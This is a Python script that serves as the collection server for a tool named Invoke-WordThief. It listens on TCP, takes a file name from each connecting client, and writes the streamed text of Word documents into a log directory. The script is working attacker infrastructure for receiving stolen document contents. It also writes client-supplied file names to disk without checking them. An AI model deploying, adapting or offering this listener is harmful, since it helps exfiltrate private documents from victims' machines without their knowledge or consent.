import socket
from _thread import *
import threading
import argparse
  
max_msg_size = 1024


# thread function 
def threaded(c,log_dir): 
    # get client's ip
    client = c.getpeername()[0]

    # get doc name
    filename = c.recv(max_msg_size).decode('utf-8')

    with open(f'{log_dir}/{filename}', 'ab+') as log_file:
        print(f'{client} - {filename} has been opened, writing text to "{log_dir}/{filename}"')
        # write head title (date and file name)
        log_file.write(c.recv(max_msg_size))
        
        while True:
            try:
                data = c.recv(max_msg_size)
                log_file.write(data)
                log_file.flush()
            except socket.error:
                print(f"{client} - {filename} has been closed")
  
def Main(args): 
    
    port = args.lport
    bind = args.bind
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    s.bind(('', port)) 
    
  
    # put the socket into listening mode 
    s.listen() 
    
    print(f'Listening for documents... ({bind}:{port})')
  
    # a forever loop until client wants to exit 
    while True: 
  
        # establish connection with client 
        c, addr = s.accept() 
  
        # Start a new thread and return its identifier 
        start_new_thread(threaded, (c,args.log_dir)) 
    s.close() 
  
  
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='TCP Listener for Invoke-WordThief document text')
    parser.add_argument('-o', '-d', '--log_dir', type=str, help='Full path of log directory.', default='/tmp')
    parser.add_argument('-p', '-l', '--lport', type=int, help='Listening port of log server', default=8888)
    parser.add_argument('-b', '--bind', type=str, help='Bind address to listen to', default='0.0.0.0')
    args = parser.parse_args()
    try:
        Main(args) 
    except KeyboardInterrupt:
        print('[-]')